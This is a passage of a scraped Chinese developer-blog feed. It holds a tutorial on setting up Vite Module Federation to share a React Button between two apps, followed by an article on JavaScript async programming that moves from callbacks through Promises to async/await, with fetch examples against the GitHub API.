pre:before{content:"";display:block;height:30px;width:100%;margin-bottom:-7px;background:url(data:image/png;base64,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) 10px 10px no-repeat;background-size:40px;background-color:#fdfdfd}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#fdfdfd}.markdown-body a{text-decoration:none;font-weight:700;color:#ef7060;border-bottom:1px solid #ef7060}.markdown-body a:active,.markdown-body a:hover{color:#ef2d26}.markdown-body table tr td,.markdown-body table tr th{border:1px solid #ccc;padding:5px 10px}.markdown-body table{display:block!important;width:auto;max-width:100%;overflow:auto;border-collapse:collapse}.markdown-body thead{background:#f0f0f0;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#f8f8f8}.markdown-body blockquote{margin-inline-start:0;margin-inline-end:0;border-left:3px solid #ef7060;background:#fff9f9;padding:1px 20px;margin-top:20px}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="atelier-sulphurpool-dark">.hljs-comment,.hljs-quote{color:#898ea4}.hljs-attribute,.hljs-link,.hljs-name,.hljs-regexp,.hljs-selector-class,.hljs-selector-id,.hljs-tag,.hljs-template-variable,.hljs-variable{color:#c94922}.hljs-built_in,.hljs-builtin-name,.hljs-literal,.hljs-meta,.hljs-number,.hljs-params,.hljs-type{color:#c76b29}.hljs-bullet,.hljs-string,.hljs-symbol{color:#ac9739}.hljs-section,.hljs-title{color:#3d8fd1}.hljs-keyword,.hljs-selector-tag{color:#6679cc}.markdown-body pre,.markdown-body pre&gt;code.hljs{background:#202746;color:#979db4}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">Module Federation</h2>
<blockquote>
<p>Module Federation 的核心是  <strong>“打破构建边界，实现模块级的跨应用共享与协同”</strong> ，其最佳使用场景需满足以下特征：</p>
<ul>
<li>应用 / 模块由多团队独立开发维护；</li>
<li>需要复用公共依赖或组件，避免重复打包；</li>
<li>希望简化模块更新流程（免 npm 发布）；</li>
<li>需实现微前端、跨技术栈协作或模块级灰度发布。</li>
</ul>
</blockquote>
<blockquote>
<p>注意： 每个应用都可以在 Federation 中暴露 或者加载 远程可共享模块</p>
</blockquote>
<h3 data-id="heading-1">如何使用 vite 搭建 MF</h3>
<blockquote>
<p>项目 github 参考地址： <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fkejuqu%2Ffebe-repos" target="_blank" title="https://github.com/kejuqu/febe-repos" ref="nofollow noopener noreferrer">github.com/kejuqu/febe…</a></p>
</blockquote>
<h4 data-id="heading-2">创建两个应用 <code>vite-react</code> 和 <code>vite-react-provider</code></h4>
<ul>
<li><code>vite-react-provider</code> 暴露 Button 组件</li>
<li><code>vite-react</code> 使用 <code>vite-react-provider</code> 应用暴露的 Button 组件</li>
</ul>
<h4 data-id="heading-3"><code>vite-react-provider</code> 应用</h4>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// vite.config.ts</span>
<span class="hljs-keyword">import</span> { defineConfig, type <span class="hljs-title class_">PluginOption</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">"vite"</span>;
<span class="hljs-keyword">import</span> react <span class="hljs-keyword">from</span> <span class="hljs-string">"@vitejs/plugin-react"</span>;
<span class="hljs-keyword">import</span> { federation } <span class="hljs-keyword">from</span> <span class="hljs-string">"@module-federation/vite"</span>;

<span class="hljs-comment">// https://vite.dev/config/</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-title function_">defineConfig</span>({
  <span class="hljs-attr">server</span>: {
    <span class="hljs-attr">port</span>: <span class="hljs-number">3006</span>,
  },
  <span class="hljs-attr">plugins</span>: [
    <span class="hljs-title function_">react</span>({
      <span class="hljs-attr">babel</span>: {
        <span class="hljs-attr">plugins</span>: [[<span class="hljs-string">"babel-plugin-react-compiler"</span>]],
      },
    }),
    <span class="hljs-title function_">federation</span>({
      <span class="hljs-attr">name</span>: <span class="hljs-string">"remote"</span>,
      <span class="hljs-attr">filename</span>: <span class="hljs-string">"remoteEntry.js"</span>,
      <span class="hljs-comment">// exposes 暴露 组件或者使用的工具函数</span>
      <span class="hljs-attr">exposes</span>: {
        <span class="hljs-string">"./c-button"</span>: <span class="hljs-string">"./src/components/button.tsx"</span>,
      },
      <span class="hljs-attr">shared</span>: [<span class="hljs-string">"react"</span>, <span class="hljs-string">"react-dom"</span>],
    }) <span class="hljs-keyword">as</span> <span class="hljs-title class_">PluginOption</span>[],
  ],
});

<span class="hljs-comment">// src/components/button.tsx</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">Button</span>(<span class="hljs-params">props: React.ComponentProps&lt;<span class="hljs-string">"button"</span>&gt;</span>) {
  <span class="hljs-keyword">return</span> <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">button</span> {<span class="hljs-attr">...props</span>}&gt;</span>button from remote<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span></span>;
}
</code></pre>
<h4 data-id="heading-4"><code>vite-react</code> 使用 React.Lazy + dynamic import 加载远程模块</h4>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// vite.config.ts</span>
<span class="hljs-keyword">import</span> { defineConfig } <span class="hljs-keyword">from</span> <span class="hljs-string">"vite"</span>;
<span class="hljs-keyword">import</span> { federation } <span class="hljs-keyword">from</span> <span class="hljs-string">"@module-federation/vite"</span>;
<span class="hljs-keyword">import</span> react <span class="hljs-keyword">from</span> <span class="hljs-string">"@vitejs/plugin-react"</span>;

<span class="hljs-comment">// https://vite.dev/config/</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-title function_">defineConfig</span>({
  <span class="hljs-attr">server</span>: {
    <span class="hljs-attr">port</span>: <span class="hljs-number">3005</span>,
  },
  <span class="hljs-attr">plugins</span>: [
    <span class="hljs-title function_">react</span>({
      <span class="hljs-attr">babel</span>: {
        <span class="hljs-attr">plugins</span>: [[<span class="hljs-string">"babel-plugin-react-compiler"</span>]],
      },
    }),
    <span class="hljs-title function_">federation</span>({
      <span class="hljs-attr">name</span>: <span class="hljs-string">"customer"</span>,
      <span class="hljs-attr">filename</span>: <span class="hljs-string">"vite-react.js"</span>,
      <span class="hljs-comment">// // exposes 暴露 组件或者使用的工具函数</span>
      <span class="hljs-comment">// exposes: {</span>
      <span class="hljs-comment">//   "./utils": "./src/utils.tsx",</span>
      <span class="hljs-comment">// },</span>
      <span class="hljs-attr">remotes</span>: {
        <span class="hljs-attr">remote</span>: {
          <span class="hljs-attr">type</span>: <span class="hljs-string">"module"</span>,
          <span class="hljs-attr">name</span>: <span class="hljs-string">"remote"</span>,
          <span class="hljs-attr">entry</span>: <span class="hljs-string">"http://localhost:3006/remoteEntry.js"</span>,
          <span class="hljs-attr">entryGlobalName</span>: <span class="hljs-string">"remote"</span>,
          <span class="hljs-attr">shareScope</span>: <span class="hljs-string">"default"</span>,
        },
      },
      <span class="hljs-attr">shared</span>: [<span class="hljs-string">"react"</span>, <span class="hljs-string">"react-dom"</span>],
    }),
  ],
});


<span class="hljs-comment">// src/App.tsx</span>
<span class="hljs-keyword">import</span> <span class="hljs-title class_">React</span> <span class="hljs-keyword">from</span> <span class="hljs-string">"react"</span>;
<span class="hljs-keyword">import</span> <span class="hljs-string">"./App.css"</span>;

<span class="hljs-keyword">function</span> <span class="hljs-title function_">App</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">const</span> <span class="hljs-title class_">RemoteBtn</span> = <span class="hljs-title class_">React</span>.<span class="hljs-title function_">lazy</span>(<span class="hljs-function">() =&gt;</span> <span class="hljs-keyword">import</span>(<span class="hljs-string">"remote/c-button"</span>));

  <span class="hljs-keyword">return</span> (
    <span class="xml"><span class="hljs-tag">&lt;&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">React.Suspense</span> <span class="hljs-attr">fallback</span>=<span class="hljs-string">{</span>&lt;<span class="hljs-attr">div</span>&gt;</span>loading...<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>}&gt;
        <span class="hljs-tag">&lt;<span class="hljs-name">RemoteBtn</span> <span class="hljs-attr">onClick</span>=<span class="hljs-string">{()</span> =&gt;</span> alert("clicked")} /&gt;
      <span class="hljs-tag">&lt;/<span class="hljs-name">React.Suspense</span>&gt;</span>
    <span class="hljs-tag">&lt;/&gt;</span></span>
  );
}

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-title class_">App</span>;
</code></pre>
<h4 data-id="heading-5">效果图</h4>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/58f03d0efca94ae68eadce1ff86b881a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5LiA5Y2D5p-v5qmY:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764491516&amp;x-signature=aLUFDZdcogXymuEubcgG3h7bQVo%3D" alt="image.png" loading="lazy"/></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[深入理解 JavaScript 中的异步编程：从回调到 async/await]]></title>    <link>https://juejin.cn/post/7575162322239995904</link>    <guid>https://juejin.cn/post/7575162322239995904</guid>    <pubDate>2025-11-23T08:35:05.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7575162322239995904" data-draft-id="7575112613777997858" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="深入理解 JavaScript 中的异步编程：从回调到 async/await"/> <meta itemprop="keywords" content="Promise"/> <meta itemprop="datePublished" content="2025-11-23T08:35:05.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Tzarevich"/> <meta itemprop="url" content="https://juejin.cn/user/578786070367529"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            深入理解 JavaScript 中的异步编程：从回调到 async/await
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/578786070367529/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Tzarevich
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-23T08:35:05.000Z" title="Sun Nov 23 2025 08:35:05 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-23
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读3分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">深入理解 JavaScript 中的异步编程：从回调到 async/await</h2>
<p>在现代 Web 开发中，异步操作无处不在——无论是从服务器获取数据、读取本地文件，还是处理用户交互。JavaScript 作为一门单线程语言，通过多种机制支持异步编程。本文将带你回顾异步编程的发展历程，并重点解析 <code>async/await</code> 这一 ES8 引入的强大语法糖。</p>
<hr/>
<h3 data-id="heading-1">1. 回调函数（Callback）时代：最初的异步方案</h3>
<p>早期的 JavaScript 主要依赖<strong>回调函数</strong>来处理异步操作。例如，在 Node.js 中使用 <code>fs.readFile</code> 读取文件：</p>
<pre><code class="hljs language-javascript" lang="javascript">fs.<span class="hljs-title function_">readFile</span>(<span class="hljs-string">'./1.html'</span>, <span class="hljs-string">'utf-8'</span>, <span class="hljs-function">(<span class="hljs-params">err, data</span>) =&gt;</span> {
    <span class="hljs-keyword">if</span> (err) {
        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(err);
        <span class="hljs-keyword">return</span>;
    }
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(data);
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-number">111</span>);
});
</code></pre>
<p>这种方式简单直接，但存在明显问题：</p>
<ul>
<li><strong>回调地狱（Callback Hell）</strong> ：多层嵌套导致代码难以阅读和维护。</li>
<li><strong>错误处理分散</strong>：每个回调都需要单独处理错误。</li>
</ul>
<hr/>
<h3 data-id="heading-2">2. Promise：ES6 带来的结构化异步</h3>
<p>为了解决回调地狱，ES6 引入了 <strong>Promise</strong> 对象，它代表一个异步操作的最终完成（或失败）及其结果值。</p>
<p>我们可以将 <code>fs.readFile</code> 封装成一个 Promise：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> p = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Promise</span>(<span class="hljs-function">(<span class="hljs-params">resolve, reject</span>) =&gt;</span> {
    fs.<span class="hljs-title function_">readFile</span>(<span class="hljs-string">'./1.html'</span>, <span class="hljs-string">'utf-8'</span>, <span class="hljs-function">(<span class="hljs-params">err, data</span>) =&gt;</span> {
        <span class="hljs-keyword">if</span> (err) {
            <span class="hljs-title function_">reject</span>(err);
            <span class="hljs-keyword">return</span>;
        }
        <span class="hljs-title function_">resolve</span>(data);
    });
});

p.<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">data</span> =&gt;</span> {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(data);
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-number">111</span>);
}).<span class="hljs-keyword">catch</span>(<span class="hljs-function"><span class="hljs-params">err</span> =&gt;</span> {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(err);
});
</code></pre>
<p>Promise 的优势：</p>
<ul>
<li>链式调用（<code>.then().then()</code>）</li>
<li>统一的错误处理（<code>.catch()</code>）</li>
<li>更清晰的异步流程控制</li>
</ul>
<p>但 <code>.then()</code> 链仍然不够“同步感”，尤其在复杂逻辑中仍显繁琐。</p>
<hr/>
<h3 data-id="heading-3">3. async / await：ES8 的终极优雅方案</h3>
<p>ES8（ECMAScript 2017）引入了 <strong><code>async</code> 和 <code>await</code></strong>，让异步代码写起来像同步代码一样直观。</p>
<h4 data-id="heading-4">基本用法</h4>
<ul>
<li><code>async</code> 用于声明一个函数为异步函数，该函数<strong>总是返回一个 Promise</strong>。</li>
<li><code>await</code> 只能在 <code>async</code> 函数内部使用，用于“等待”一个 Promise 被 resolve，并将其结果赋值给变量。</li>
</ul>
<p>例如，封装后的文件读取可以这样写：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> <span class="hljs-title function_">main</span> = <span class="hljs-keyword">async</span> (<span class="hljs-params"/>) =&gt; {
    <span class="hljs-keyword">try</span> {
        <span class="hljs-keyword">const</span> html = <span class="hljs-keyword">await</span> p; <span class="hljs-comment">// 等待 Promise 完成</span>
        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(html);
        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-number">111</span>);
    } <span class="hljs-keyword">catch</span> (err) {
        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(err);
    }
};
<span class="hljs-title function_">main</span>();
</code></pre>
<p>再比如，从 GitHub API 获取用户仓库信息：</p>
<pre><code class="hljs language-ini" lang="ini">const <span class="hljs-attr">main</span> = async () =&gt; {
    try {
        const <span class="hljs-attr">res</span> = await fetch(<span class="hljs-string">'https://api.github.com/users/shunwuyu/repos'</span>)<span class="hljs-comment">;</span>
        const <span class="hljs-attr">data</span> = await res.json()<span class="hljs-comment">;</span>
        console.log(data)<span class="hljs-comment">;</span>
    } catch (error) {
        console.error('请求失败:', error)<span class="hljs-comment">;</span>
    }
}<span class="hljs-comment">;</span>
main()<span class="hljs-comment">;</span>
</code></pre>
<h4 data-id="heading-5">优势总结</h4>

























<table><thead><tr><th>特性</th><th>说明</th></tr></thead><tbody><tr><td><strong>可读性强</strong></td><td>代码结构接近同步逻辑，易于理解和调试</td></tr><tr><td><strong>错误处理统一</strong></td><td>使用 <code>try...catch</code> 捕获异步错误</td></tr><tr><td><strong>避免回调地狱</strong></td><td>不再需要层层嵌套 <code>.then()</code></td></tr><tr><td><strong>与现有 Promise 兼容</strong></td><td><code>await</code> 后可接任何 Promise</td></tr></tbody></table>
<hr/>
<h3 data-id="heading-6">4. 实际应用场景对比</h3>
<p>以获取 GitHub 用户仓库为例：</p>
<ul>
<li>
<p><strong>传统 Promise 链式写法</strong>：</p>
<pre><code class="hljs language-ini" lang="ini">fetch('https://api.github.com/users/shunwuyu/repos')
  .then(<span class="hljs-attr">res</span> =&gt; res.json())
  .then(<span class="hljs-attr">data</span> =&gt; console.log(data))
  .catch(<span class="hljs-attr">err</span> =&gt; console.error(err))<span class="hljs-comment">;</span>
</code></pre>
</li>
<li>
<p><strong>async/await 写法</strong>：</p>
<pre><code class="hljs language-ini" lang="ini">const <span class="hljs-attr">getRepos</span> = async () =&gt; {
    try {
        const <span class="hljs-attr">res</span> = await fetch(<span class="hljs-string">'https://api.github.com/users/shunwuyu/repos'</span>)<span class="hljs-comment">;</span>
        const <span class="hljs-attr">data</span> = await res.json()<span class="hljs-comment">;</span>
        console.log(data)<span class="hljs-comment">;</span>
    } catch (err) {
        console.error(err)<span class="hljs-comment">;</span>
    }
}<span class="hljs-comment">;</span>
getRepos()<span class="hljs-comment">;</span>
</code></pre>
</li>
</ul>
<p>后者更接近自然语言：“先获取响应，再解析 JSON，最后打印数据”。</p>
<hr/>
<h3 data-id="heading-7">5. 注意事项</h3>
<ul>
<li><code>await</code> 只能在 <code>async</code> 函数内使用。</li>
<li><code>async</code> 函数总是返回 Promise，即使你 <code>return</code> 一个普通值。</li>
<li>多个不相关的异步操作应避免串行 <code>await</code>，可使用 <code>Promise.all()</code> 并行处理以提升性能。</li>
</ul>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-comment">// ❌ 低效：串行执行</span>
